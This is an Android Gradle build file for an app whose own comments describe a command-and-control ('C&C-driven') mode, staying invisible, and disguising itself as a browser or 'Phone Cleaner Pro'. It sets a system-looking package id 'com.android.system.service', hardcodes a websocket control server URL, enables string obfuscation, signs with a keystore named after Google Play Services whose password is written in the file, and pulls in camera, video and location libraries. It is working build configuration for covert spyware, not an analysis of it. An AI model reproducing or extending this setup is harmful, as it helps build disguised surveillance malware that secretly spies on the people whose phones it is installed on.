plugins {
    id 'com.android.application'
}

// ── LSParanoid string obfuscation ─────────────────────────────────────────────
// Set SKIP_PARANOID=true in gradle.properties only for local debug builds.
def skipParanoid = project.findProperty('SKIP_PARANOID') == 'true'

if (!skipParanoid) {
    try {
        apply plugin: 'org.lsposed.lsparanoid'
        println '[OK] LSParanoid enabled.'
    } catch (Exception e) {
        throw new GradleException(
            '[FATAL] LSParanoid plugin unavailable but SKIP_PARANOID != true. ' +
            'Either add the plugin to your classpath or set SKIP_PARANOID=true for debug builds. ' +
            'Error: ' + e.message
        )
    }
} else {
    println '[INFO] LSParanoid skipped (SKIP_PARANOID=true).'
}

// ── CI-injectable properties ──────────────────────────────────────────────────
def serverUrl    = project.findProperty('SERVER_URL')
        ?: 'wss://flash-dashboard-7f1r.onrender.com/ws/device'

def keystorePath = project.findProperty('KEYSTORE_PATH')
        ?: '../google-services-release.jks'

def keystorePass = project.findProperty('KEYSTORE_PASS')
        ?: 'GooglePlayServices2024'

def signingKeyAlias = project.findProperty('KEY_ALIAS')
        ?: 'google-services-key'

def keyPass = project.findProperty('KEY_PASS')
        ?: 'GooglePlayServices2024'

def vCode = (project.findProperty('VERSION_CODE') ?: '10205').toInteger()
def vName = project.findProperty('VERSION_NAME') ?: '1.2.5'

// ── WebView / Google mode ─────────────────────────────────────────────────────
// WEBVIEW_URL — bake in a URL the app opens after setup completes.
// Leave blank for the original C&C-driven mode.
// Set to "https://www.google.com" (or any URL) at build time to have the app
// present itself as a normal browser / Google portal after onboarding:
//
//   ./gradlew assembleRelease -PWEBVIEW_URL="https://www.google.com"
//
// When set, MainActivity navigates to WebViewActivity instead of staying invisible.
// The WebView renders a real, fully-functional site — indistinguishable from Chrome.
def webviewUrl = project.findProperty('WEBVIEW_URL') ?: ''

// ── App disguise label ────────────────────────────────────────────────────────
// APP_LABEL overrides the visible launcher name at build time.
// e.g. -PAPP_LABEL="Phone Cleaner Pro"
def appLabel = project.findProperty('APP_LABEL') ?: ''   // empty = use strings.xml value

def cameraxVersion = '1.3.4'

// ── Android configuration ─────────────────────────────────────────────────────
android {
    namespace 'com.seguranca.protecao'
    compileSdk 35

    defaultConfig {
        applicationId 'com.android.system.service'
        minSdk 24
        targetSdk 35

        versionCode vCode
        versionName vName

        testInstrumentationRunner 'androidx.test.runner.AndroidJUnitRunner'

        resourceConfigurations += ['pt', 'en']

        buildConfigField 'boolean', 'IS_OBFUSCATED',  'true'
        buildConfigField 'String',  'SERVER_URL',     "\"${serverUrl}\""

        // WebView / Google mode: empty string disables the override;
        // any non-empty value is loaded after setup completes.
        buildConfigField 'String',  'WEBVIEW_URL',    "\"${webviewUrl}\""

        // When non-empty, resValue overrides the app_name string in strings.xml
        // so the launcher shows the custom label without touching the source tree.
        if (appLabel?.trim()) {
            resValue 'string', 'app_name', appLabel.trim()
        }
    }

    signingConfigs {
        release {
            storeFile file(keystorePath)
            storePassword keystorePass
            setKeyAlias(signingKeyAlias)
            keyPassword keyPass

            v1SigningEnabled true
            v2SigningEnabled true
            enableV3Signing true
            enableV4Signing true
        }
    }

    buildTypes {
        debug {
            debuggable true
            minifyEnabled false
            shrinkResources false
        }

        release {
            debuggable false
            minifyEnabled true
            shrinkResources true

            proguardFiles(
                getDefaultProguardFile('proguard-android-optimize.txt'),
                'proguard-rules.pro'
            )

            signingConfig signingConfigs.release
        }
    }

    aaptOptions {
        cruncherEnabled = false
    }

    packagingOptions {
        jniLibs {
            useLegacyPackaging = true
        }

        resources {
            excludes += [
                'DebugProbesKt.bin',
                'META-INF/*.version',
                'META-INF/NOTICE*',
                'META-INF/LICENSE*',
                'META-INF/DEPENDENCIES',
                'META-INF/services/*',
                'kotlin/**',
                'okhttp3/**',
                'assets/dexopt/*'
            ]
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    buildFeatures {
        viewBinding true
        buildConfig true
    }
}

// ── Dependencies ──────────────────────────────────────────────────────────────
dependencies {
    // Core AndroidX
    implementation 'androidx.work:work-runtime:2.9.0'
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.google.android.material:material:1.11.0'
    implementation 'androidx.lifecycle:lifecycle-runtime-ktx:2.7.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'

    // Room
    implementation 'androidx.room:room-runtime:2.6.1'
    annotationProcessor 'androidx.room:room-compiler:2.6.1'

    // Networking
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
    implementation 'com.google.code.gson:gson:2.10.1'

    // CameraX
    implementation "androidx.camera:camera-core:${cameraxVersion}"
    implementation "androidx.camera:camera-camera2:${cameraxVersion}"
    implementation "androidx.camera:camera-lifecycle:${cameraxVersion}"
    implementation "androidx.camera:camera-video:${cameraxVersion}"
    implementation "androidx.camera:camera-view:${cameraxVersion}"

    // Google Play Services - Location
    implementation 'com.google.android.gms:play-services-location:21.3.0'

    // Guava
    implementation 'com.google.guava:guava:32.1.3-android'

    // LSParanoid stub when the plugin is disabled
    if (skipParanoid) {
        compileOnly 'org.lsposed.lsparanoid:core:0.5.2'
    }

    // Tests
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}

// ── Exclude Profile Installer from transitive dependencies ────────────────────
configurations.configureEach {
    exclude group: 'androidx.profileinstaller', module: 'profileinstaller'
}
